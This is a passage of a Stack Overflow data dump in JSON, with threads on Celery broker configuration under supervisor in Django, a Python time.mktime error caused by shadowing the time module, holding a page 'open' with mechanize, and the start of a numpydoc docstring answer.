cool..then put your supervisor script here"}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428176434, "post_id": 29402447, "comment_id": 47067187, "body": "try different log file for error and output. <code>celery-worker_out.log</code> and <code>celery-worker_error.log</code>.Then check eror logs"}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428183821, "post_id": 29402447, "comment_id": 47069126, "body": "I did this and restarted supervisor with sudo supervisorctl restart tp-celery"}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428184990, "post_id": 29402447, "comment_id": 47069386, "body": "Interestingly the output is still being send to the old log. Shouldn&#39;t supervisor kill the old processes and use the new logs? sudo supervisorctl reread also doesn&#39;t change anything."}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428186494, "post_id": 29402447, "comment_id": 47069762, "body": "ok based on <a href=\"http://www.onurguzel.com/supervisord-restarting-and-reloading/\" rel=\"nofollow noreferrer\">onurguzel.com/supervisord-restarting-and-reloading</a> I did supervisorctl update, then started and stopped tp-celery"}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428214258, "post_id": 29402447, "comment_id": 47074409, "body": "Now new log? after <code>reread</code> and <code>update</code>?"}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428256764, "post_id": 29402447, "comment_id": 47084627, "body": "Now it is working i think ?what is the problem now ? check <code>error</code> log also if any error happened ?"}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428260555, "post_id": 29402447, "comment_id": 47085857, "body": "Yes, it is working, but the original problem remains. if I run celery worker [2015-04-03 13:17:21,571: ERROR/MainProcess] consumer: Cannot connect to amqp://guest:**@127.0.0.1:5672//: [Errno 111] Connection refused."}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428263383, "post_id": 29402447, "comment_id": 47086789, "body": "Then why are you trying <code>celery worker</code> after all this working correct? i didnt understand that effort ?"}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428325914, "post_id": 29402447, "comment_id": 47105165, "body": "Its not just celery worker ,  all the celery inspect commands give the same error. I found this out after trying your answer on <a href=\"http://stackoverflow.com/questions/29319889/how-to-list-of-the-queued-items-in-celery\" title=\"how to list of the queued items in celery\">stackoverflow.com/questions/29319889/&hellip;</a>"}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428326586, "post_id": 29402447, "comment_id": 47105504, "body": "if you want that, <code>celery --app=tp.celery:app inspect active_queues</code> or simply <code>celery -A tp inspect active_queues</code>"}, {"owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428326761, "post_id": 29402447, "comment_id": 47105588, "body": "Another thing, no need of <code>--app</code>(its not error :)), simply <code>celery -A tp worker --loglevel=INFO</code>"}, {"owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "reply_to_user": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "edited": false, "score": 0, "creation_date": 1428328896, "post_id": 29402447, "comment_id": 47106728, "body": "Ok , thank you, that works. I misunderstood the docs. Can you enter this as an answer please."}], "answers": [{"tags": [], "owner": {"reputation": 17410, "user_id": 3160881, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/96c8o.png?s=128&g=1", "display_name": "itzMEonTV", "link": "https://stackoverflow.com/users/3160881/itzmeontv"}, "is_accepted": true, "score": 5, "last_activity_date": 1428329162, "last_edit_date": 1428329162, "creation_date": 1428072714, "answer_id": 29434489, "question_id": 29402447, "link": "https://stackoverflow.com/questions/29402447/how-to-set-celeryconfig-file-in-in-django/29434489#29434489", "title": "How to set celeryconfig file in in django", "body": "<p>Dont run <code>celery woker</code> only..run like <code>celery -A tp worker -l info</code>. It will take default <code>config</code>.</p>\n\n<p>For <code>celery inspect</code></p>\n\n<pre><code>celery --app=tp.celery:app inspect active_queues\n</code></pre>\n\n<p><strong>OR simply</strong></p>\n\n<pre><code>celery -A tp inspect active_queues\n</code></pre>\n"}], "owner": {"reputation": 26209, "user_id": 1592380, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/1b375c795476432e64d4433a651d2804?s=128&d=identicon&r=PG", "display_name": "user1592380", "link": "https://stackoverflow.com/users/1592380/user1592380"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2800, "favorite_count": 1, "accepted_answer_id": 29434489, "answer_count": 1, "score": 1, "last_activity_date": 1428329162, "creation_date": 1427930038, "last_edit_date": 1495541791, "question_id": 29402447, "link": "https://stackoverflow.com/questions/29402447/how-to-set-celeryconfig-file-in-in-django", "title": "How to set celeryconfig file in in django", "body": "<p><img src=\"https://i.stack.imgur.com/nPw4r.png\" alt=\"enter image description here\"></p>\n\n<p>I have a Django project on an Ubuntu EC2 node, which I have been using to set up an asynchronous using <code>Celery</code>. I've been trying to follow <a href=\"http://michal.karzynski.pl/blog/2014/05/18/setting-up-an-asynchronous-task-queue-for-django-using-celery-redis/\" rel=\"nofollow noreferrer\">http://michal.karzynski.pl/blog/2014/05/18/setting-up-an-asynchronous-task-queue-for-django-using-celery-redis/</a></p>\n\n<p>I've been able to get a basic task working at the command line, using:</p>\n\n<pre><code>(env1)ubuntu@ip-172-31-22-65:~/projects/tp$ celery --app=tp.celery:app worker --loglevel=INFO\n\n(env1)ubuntu@ip-172-31-22-65:~/projects/tp$ celery --app=tp.celery:app worker --loglevel=INFO\n\n -------------- celery@ip-172-31-22-65 v3.1.17 (Cipater)\n---- **** -----\n--- * ***  * -- Linux-3.13.0-44-generic-x86_64-with-Ubuntu-14.04-trusty\n-- * - **** ---\n- ** ---------- [config]\n- ** ---------- .&gt; app:         tp:0x7f66a89c0470\n- ** ---------- .&gt; transport:   redis://localhost:6379/0\n- ** ---------- .&gt; results:     disabled\n- *** --- * --- .&gt; concurrency: 1 (prefork)\n-- ******* ----\n--- ***** ----- [queues]\n -------------- .&gt; celery           exchange=celery(direct) key=celery\n</code></pre>\n\n<p>However, if I run other celery commands like below I'm getting the following:</p>\n\n<pre><code>(env1)ubuntu@ip-172-31-22-65:~/projects/tp$ celery worker                       [2015-04-03 13:17:21,553: WARNING/MainProcess] /home/ubuntu/.virtualenvs/env1/lib/python3.4/site-packages/celery/apps/worker.py:161: \n\n\n -------------- celery@ip-172-31-22-65 v3.1.17 (Cipater)\n---- **** -----\n--- * ***  * -- Linux-3.13.0-44-generic-x86_64-with-Ubuntu-14.04-trusty\n-- * - **** ---\n- ** ---------- [config]\n- ** ---------- .&gt; app:         default:0x7f1653eae7b8 (.default.Loader)\n- ** ---------- .&gt; transport:   amqp://guest:**@localhost:5672//\n- ** ---------- .&gt; results:     disabled\n- *** --- * --- .&gt; concurrency: 1 (prefork)\n-- ******* ----\n--- ***** ----- [queues]\n -------------- .&gt; celery           exchange=celery(direct) key=celery\n\n\n[2015-04-03 13:17:21,571: ERROR/MainProcess] consumer: Cannot connect to amqp://guest:**@127.0.0.1:5672//: [Errno 111] Connection refused.\n</code></pre>\n\n<p>It appears that celery thinks I'm using amqp as a broker , but I'm using redis!!</p>\n\n<p>Based on <a href=\"https://stackoverflow.com/questions/16176533/celery-tries-to-connect-to-the-wrong-broker\">Celery tries to connect to the wrong broker</a>, it seems likely that celery cannot find the configuration file and uses the default.</p>\n\n<p>In the above question they recommend:</p>\n\n<pre><code>import your celery and add your broker like that : \n\ncelery = Celery('task', broker='redis://127.0.0.1:6379')\ncelery.config_from_object(celeryconfig)\n</code></pre>\n\n<p>Where would I do this? is my celery.py file (below), the same as a celery config?</p>\n\n<p>/projects/tp/tp/celery.py</p>\n\n<pre><code>from __future__ import absolute_import\n\nimport os\nimport django\nfrom celery import Celery\nfrom django.conf import settings\n\n# set the default Django settings module for the 'celery' program.\nos.environ.setdefault('DJANGO_SETTINGS_MODULE', 'tp.settings')\ndjango.setup()\n\napp = Celery('hello_django')\n\n# Using a string here means the worker will not have to\n# pickle the object when using Windows.\napp.config_from_object('django.conf:settings')\napp.autodiscover_tasks(lambda: settings.INSTALLED_APPS)\n</code></pre>\n\n<p>tasks.py:</p>\n\n<pre><code>from __future__ import absolute_import\nfrom celery import shared_task\nfrom django.core.cache import cache\n\n\n@shared_task\ndef tester1(param):\n    return 'The test task executed with argument \"%s\" ' % param\n</code></pre>\n\n<p>tp/tp1/views</p>\n\n<pre><code>@csrf_exempt\ndef tester(request):\n\n    tester1.delay('hi')\n\n    return HttpResponse('hTML')\n</code></pre>\n\n<p>/etc/supervisor/conf.d/tp-celery.conf</p>\n\n<pre><code>[program:tp-celery]\ncommand=/home/ubuntu/.virtualenvs/env1/bin/celery --app=tp.celery:app worker --loglevel=INFO\ndirectory=/home/ubuntu/projects/tp\nuser=ubuntu\nnumprocs=1\nstdout_logfile=/var/log/celery-worker-out.log\nstderr_logfile=/var/log/celery-worker-err.log\n\nautostart=true\nautorestart=true\nstartsecs=10\n\n; Need to wait for currently executing tasks to finish at shutdown.\n; Increase this if you have very long running tasks.\nstopwaitsecs = 600\n\n; When resorting to send SIGKILL to the program to terminate it\n; send SIGKILL to its whole process group instead,\n; taking care of its children as well.\nkillasgroup=true\n</code></pre>\n\n<p>/var/log/celery-worker-out.log</p>\n\n<pre><code> -------------- celery@ip-172-31-22-65 v3.1.17 (Cipater)\n---- **** ----- \n--- * ***  * -- Linux-3.13.0-44-generic-x86_64-with-Ubuntu-14.04-trusty\n-- * - **** --- \n- ** ---------- [config]\n- ** ---------- .&gt; app:         tp:0x7fa33e424cf8\n- ** ---------- .&gt; transport:   redis://localhost:6379/0\n- ** ---------- .&gt; results:     disabled\n- *** --- * --- .&gt; concurrency: 1 (prefork)\n-- ******* ---- \n--- ***** ----- [queues]\n -------------- .&gt; celery           exchange=celery(direct) key=celery\n\n\n[tasks]\n  . testapp.tasks.tester1\n</code></pre>\n"}, {"tags": ["python", "datetime", "time", "pandas", "mktime"], "answers": [{"comments": [{"owner": {"reputation": 477, "user_id": 3972080, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/0908160a2cc5cff599feb7353e1087ff?s=128&d=identicon&r=PG&f=1", "display_name": "ubh", "link": "https://stackoverflow.com/users/3972080/ubh"}, "edited": false, "score": 0, "creation_date": 1427931564, "post_id": 29402424, "comment_id": 46980832, "body": "Yes, you&#39;re right. I was reading into a variable named &#39;time&#39;. Thanks!"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 343905, "user_id": 4279, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/d92ce60d3a4cbe03598e27c2e8dee69d?s=128&d=identicon&r=PG", "display_name": "jfs", "link": "https://stackoverflow.com/users/4279/jfs"}, "edited": false, "score": 0, "creation_date": 1428006955, "post_id": 29402424, "comment_id": 47015556, "body": "@J.F.Sebastian, sorry yes meant strptime."}], "tags": [], "owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "is_accepted": true, "score": 2, "last_activity_date": 1428007003, "last_edit_date": 1428007003, "creation_date": 1427929886, "answer_id": 29402424, "question_id": 29402342, "link": "https://stackoverflow.com/questions/29402342/python-time-mktime-throwing-error/29402424#29402424", "title": "python time mktime throwing error", "body": "<p>You have somehow set <code>time</code> equal to a <code>unicode</code> object in your code, you also cannot pass a <code>Timestamp</code> to <code>strptime</code> it must be a <strong>string</strong></p>\n\n<pre><code>In [15]: time = u\"foo\"\n\nIn [16]: time.mktime\n---------------------------------------------------------------------------\nAttributeError                            Traceback (most recent call last)\n&lt;ipython-input-16-b93f36374edc&gt; in &lt;module&gt;()\n----&gt; 1 time.mktime\n\nAttributeError: 'unicode' object has no attribute 'mktime'\n</code></pre>\n\n<p>You need to go through your code and see where you have references to <code>time</code>, somewhere you have <code>time = some_unicode_object</code></p>\n\n<p>Not exactly sure what you want at the end but using strftime on the TimeStamp object will be closer:</p>\n\n<pre><code>print time.mktime(datetime.datetime.strptime(compare_date.strftime(\"%Y-%m-%d\"), \"%Y-%m-%d\").timetuple())\n\n1422748800.0\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 477, "user_id": 3972080, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/0908160a2cc5cff599feb7353e1087ff?s=128&d=identicon&r=PG&f=1", "display_name": "ubh", "link": "https://stackoverflow.com/users/3972080/ubh"}, "edited": false, "score": 0, "creation_date": 1427931921, "post_id": 29402555, "comment_id": 46980925, "body": "Yes, I could get an epoch by doing time.mktime(compare_date.timetuple())"}], "tags": [], "owner": {"reputation": 10133, "user_id": 1290420, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/MmTZS.jpg?s=128&g=1", "display_name": "daedalus", "link": "https://stackoverflow.com/users/1290420/daedalus"}, "is_accepted": false, "score": 1, "last_activity_date": 1427930583, "creation_date": 1427930583, "answer_id": 29402555, "question_id": 29402342, "link": "https://stackoverflow.com/questions/29402342/python-time-mktime-throwing-error/29402555#29402555", "title": "python time mktime throwing error", "body": "<p>This is not an explanation of the error (see Padraic Cunningham's answer for that) but rather a shorter way of achieving your ultimate aim.</p>\n\n<p>You appear to be converting <code>compare_date</code> to a time tuple. This is a direct way of doing it in pandas:</p>\n\n<pre><code>import pandas as pd\ncompare_date = pd.datetime.today()+pd.DateOffset(days=-60)\nprint compare_date.timetuple()\n</code></pre>\n\n<p>Resulting in:</p>\n\n<pre><code>time.struct_time(tm_year=2015, tm_mon=2, tm_mday=1, tm_hour=1, \n                 tm_min=20, tm_sec=43, tm_wday=6, tm_yday=32, tm_isdst=-1)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 343905, "user_id": 4279, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/d92ce60d3a4cbe03598e27c2e8dee69d?s=128&d=identicon&r=PG", "display_name": "jfs", "link": "https://stackoverflow.com/users/4279/jfs"}, "is_accepted": false, "score": 0, "last_activity_date": 1428007751, "last_edit_date": 1495542505, "creation_date": 1428007751, "answer_id": 29422205, "question_id": 29402342, "link": "https://stackoverflow.com/questions/29402342/python-time-mktime-throwing-error/29422205#29422205", "title": "python time mktime throwing error", "body": "<p>See the explanation of <code>mktime()</code> error in @<a href=\"https://stackoverflow.com/a/29402424/4279\">Padraic Cunningham's answer</a>.</p>\n\n<ol>\n<li><p><code>pandas.datetime</code> is <code>datetime.datetime</code>. You should use it directly:</p>\n\n<pre><code>from datetime import datetime, timedelta\n\ncompare_date = datetime.utcnow() - timedelta(60)\nposix_timestamp = (compare_date - datetime(1970, 1, 1)).total_seconds()\n</code></pre>\n\n<p>See <a href=\"https://stackoverflow.com/q/8777753/4279\">Converting datetime.date to UTC timestamp in Python</a></p>\n\n<p>If you <code>compare_date</code> is not in UTC then you should convert it to UTC first. See <a href=\"https://stackoverflow.com/q/26313520/4279\">Find if 24 hrs have passed between datetimes - Python</a> -- note: <code>mktime()</code> may fail!</p></li>\n<li><p>To get the timestamp (epoch time) more directly, you could use <code>time.time()</code>:</p>\n\n<pre><code>import time\n\ntimestamp = time.time() - 60 * 86400 # 60 days ago\n</code></pre></li>\n</ol>\n\n<p>Both solutions ignore leap seconds (unless \"right\" timezone is used in the 2nd one).</p>\n"}], "owner": {"reputation": 477, "user_id": 3972080, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/0908160a2cc5cff599feb7353e1087ff?s=128&d=identicon&r=PG&f=1", "display_name": "ubh", "link": "https://stackoverflow.com/users/3972080/ubh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2511, "favorite_count": 0, "accepted_answer_id": 29402424, "answer_count": 3, "score": 0, "last_activity_date": 1428007751, "creation_date": 1427929443, "question_id": 29402342, "link": "https://stackoverflow.com/questions/29402342/python-time-mktime-throwing-error", "title": "python time mktime throwing error", "body": "<p>I am trying to convert a pandas datetime to an epoch using the code below.</p>\n\n<pre><code>import time\nimport pandas as pd\n\ncompare_date = pd.datetime.today()+pd.DateOffset(days=-60)\nprint time.mktime(datetime.datetime.strptime(compare_date, \"%Y-%m-%d\").timetuple())\n</code></pre>\n\n<p>It's throwing an error</p>\n\n<pre><code>'unicode' object has no attribute 'mktime'\n</code></pre>\n\n<p>I tried with this code as well</p>\n\n<pre><code>t = (2009, 2, 17, 17, 3, 38, 1, 48, 0)\nsecs = time.mktime( t )\nprint secs\n</code></pre>\n\n<p>And, it's still throwing the same error. I am using Python version 2.7.5. What am I missing here?</p>\n"}, {"tags": ["python", "mechanize", "mechanize-python"], "comments": [{"owner": {"reputation": 2777, "user_id": 1002371, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/612ee2165cc4115ea14888dbf6ae24cf?s=128&d=identicon&r=PG", "display_name": "a p", "link": "https://stackoverflow.com/users/1002371/a-p"}, "edited": false, "score": 1, "creation_date": 1427929178, "post_id": 29402262, "comment_id": 46980062, "body": "Sleep takes a number of seconds to sleep for, not minutes."}, {"owner": {"reputation": 131, "user_id": 4593006, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/rj8mL.jpg?s=128&g=1", "display_name": "deounix", "link": "https://stackoverflow.com/users/4593006/deounix"}, "reply_to_user": {"reputation": 2777, "user_id": 1002371, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/612ee2165cc4115ea14888dbf6ae24cf?s=128&d=identicon&r=PG", "display_name": "a p", "link": "https://stackoverflow.com/users/1002371/a-p"}, "edited": false, "score": 0, "creation_date": 1427929286, "post_id": 29402262, "comment_id": 46980105, "body": "@ap ok, but it&#39;s didn&#39;t work with mechanize"}, {"owner": {"reputation": 2777, "user_id": 1002371, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/612ee2165cc4115ea14888dbf6ae24cf?s=128&d=identicon&r=PG", "display_name": "a p", "link": "https://stackoverflow.com/users/1002371/a-p"}, "edited": false, "score": 1, "creation_date": 1427929427, "post_id": 29402262, "comment_id": 46980148, "body": "I don&#39;t think I understand the question, then. Sleep for 7 minutes by using <code>time.sleep(420)</code>. What&#39;s not working if not that? In what way does it not work specifically with Mechanize?"}, {"owner": {"reputation": 131, "user_id": 4593006, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/rj8mL.jpg?s=128&g=1", "display_name": "deounix", "link": "https://stackoverflow.com/users/4593006/deounix"}, "reply_to_user": {"reputation": 2777, "user_id": 1002371, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/612ee2165cc4115ea14888dbf6ae24cf?s=128&d=identicon&r=PG", "display_name": "a p", "link": "https://stackoverflow.com/users/1002371/a-p"}, "edited": false, "score": 0, "creation_date": 1427929546, "post_id": 29402262, "comment_id": 46980183, "body": "@ap I&#39;m trying to open url and keep me open this url for 7 min then close it. that&#39;s what i need. thank you"}, {"owner": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "edited": false, "score": 0, "creation_date": 1427930129, "post_id": 29402262, "comment_id": 46980376, "body": "@deounix can you share the motivation behind such an odd requirement? Thanks."}, {"owner": {"reputation": 131, "user_id": 4593006, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/rj8mL.jpg?s=128&g=1", "display_name": "deounix", "link": "https://stackoverflow.com/users/4593006/deounix"}, "reply_to_user": {"reputation": 411841, "user_id": 771848, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/2DTBv.jpg?s=128&g=1", "display_name": "alecxe", "link": "https://stackoverflow.com/users/771848/alecxe"}, "edited": false, "score": 0, "creation_date": 1427931827, "post_id": 29402262, "comment_id": 46980905, "body": "@alecxe some sites require to wait 7 second or 1 minute then show url to open it"}], "answers": [{"tags": [], "owner": {"reputation": 286, "user_id": 1390062, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5142baf94a8f8065f36c6fe86319448c?s=128&d=identicon&r=PG", "display_name": "geoelectric", "link": "https://stackoverflow.com/users/1390062/geoelectric"}, "is_accepted": true, "score": 2, "last_activity_date": 1427931004, "last_edit_date": 1427931004, "creation_date": 1427930507, "answer_id": 29402541, "question_id": 29402262, "link": "https://stackoverflow.com/questions/29402262/use-mechanize-with-python/29402541#29402541", "title": "Use mechanize with python", "body": "<p><code>mechanize</code> is a tool for performing http request/response, only with a little more ability to act like a browser than things like <code>urllib</code>.</p>\n\n<p>http is (for the most part) stateless--you don't hold a web page open in the sense you seem to be thinking. The connection was closed by the time \"open\" returned.</p>\n\n<p>You are retrieving Google's homepage, getting an object back from mechanize representing that response, waiting 7 seconds, and then asking for the url attached to the response.</p>\n\n<p>I did run your code, and to that extent it works.</p>\n\n<p><code>set_handle_refresh</code> and <code>HTTPRefreshProcessor</code> are there to come into play when a webpage has a \"refresh\" meta that causes it to reload after a certain amount of time. I believe the parameter you gave (7 seconds, not minutes, again) is the maximum amount of time mechanize will honor between refreshes. </p>\n\n<p>But in any case, Google's homepage doesn't refresh, I don't think, so this doesn't do anything there.</p>\n\n<p>You can look into HTTP Keep-Alive/Persistent connections to see if there's something to do what you want, though even keep-alive connections aren't really pages being held open from the client's POV.</p>\n"}], "owner": {"reputation": 131, "user_id": 4593006, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/rj8mL.jpg?s=128&g=1", "display_name": "deounix", "link": "https://stackoverflow.com/users/4593006/deounix"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 367, "favorite_count": 0, "accepted_answer_id": 29402541, "answer_count": 1, "score": 0, "last_activity_date": 1427931004, "creation_date": 1427928966, "question_id": 29402262, "link": "https://stackoverflow.com/questions/29402262/use-mechanize-with-python", "title": "Use mechanize with python", "body": "<p>I'm trying to open url with mechanize but not just open it and close it right away\nI want it to open the url then wait 7 minute then close the url.</p>\n\n<p>what I'm trying to do :</p>\n\n<pre><code>import mechanize\nimport cookielib\nimport time\n\n\nurl='http://google.com/'\nop = mechanize.Browser()\n\ncj = cookielib.LWPCookieJar()\nop.set_handle_robots(False)\nop.set_handle_equiv(True)\nop.set_handle_referer(True)\nop.set_handle_redirect(True)\nop.set_cookiejar(cj)\nop.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=7)\n\nop.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]\n\nop.open(url)\ntime.sleep(7)\n\nprint op.geturl()\n</code></pre>\n\n<p>but didn't work. how can I do it?</p>\n\n<p>thnx.</p>\n"}, {"tags": ["python", "spyder", "docstring", "numpydoc"], "answers": [{"comments": [{"owner": {"reputation": 4741, "user_id": 2453202, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/e606i.jpg?s=128&g=1", "display_name": "Demis", "link": "https://stackoverflow.com/users/2453202/demis"}, "edited": false, "score": 0, "creation_date": 1430761943, "post_id": 29636242, "comment_id": 48189121, "body": "Thanks!  I agree that it&#39;s a bit unfortunate that I&#39;d have to manually line-break all my documentation - I was just expecting Spyder to wrap the text appropriately.  Do you know why the <code>13.</code> &amp; <code>10.</code> numbered listing was added?  I have upgraded my Spyder - I&#39;ll see if it still behaves that way."}, {"owner": {"reputation": 27032, "user_id": 438386, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aceace9b2049723617a2f59f698df0ff?s=128&d=identicon&r=PG", "display_name": "Carlos Cordoba", "link": "https://stackoverflow.com/users/438386/carlos-cordoba"}, "reply_to_user": {"reputation": 4741, "user_id": 2453202, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/e606i.jpg?s=128&g=1", "display_name": "Demis", "link": "https://stackoverflow.com/users/2453202/demis"}, "edited": false, "score": 0, "creation_date": 1430764959, "post_id": 29636242, "comment_id": 48190975, "body": "I really don&#39;t know. I think it&#39;s a problem with Sphinx because we don&#39;t do anything other than passing docstrings to Sphinx for it to render them :-)"}], "tags": [], "owner": {"reputation": 27032, "user_id": 438386, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aceace9b2049723617a2f59f698df0ff?s=128&d=identicon&r=PG", "display_name": "Carlos Cordoba", "link": "https://stackoverflow.com/users/438386/carlos-cordoba"}, "is_accepted": true, "score": 0, "last_activity_date": 1429041257, "creation_date": 1429041257, "answer_id": 29636242, "question_id": 29402225, "link": "https://stackoverflow.com/questions/29402225/numpydoc-how-are-tabs-parsed/29636242#29636242", "title": "NumpyDoc: How are tabs parsed?", "body": "<p>(<em>Spyder dev here</em>) I've managed to get what (I think) you want by reformatting your docstring like this</p>\n\n<pre><code>def AlInGaAs(x, wl):\n'''\nReturns the refractive index of ~Al(x)Ga(1-x)In(1-x-y)As (lattice-matched\nto InP) at the specified wavelength, wl (in microns) and Aluminum content\n(x=0.0-1.0).  \n\nFor lattice-matching, the actual mole ratio, x, is defined as so:\nInP-matched X: (Al48 In52 As)_X --&gt; (Ga47 In53 As)_1-X\n\nValid for 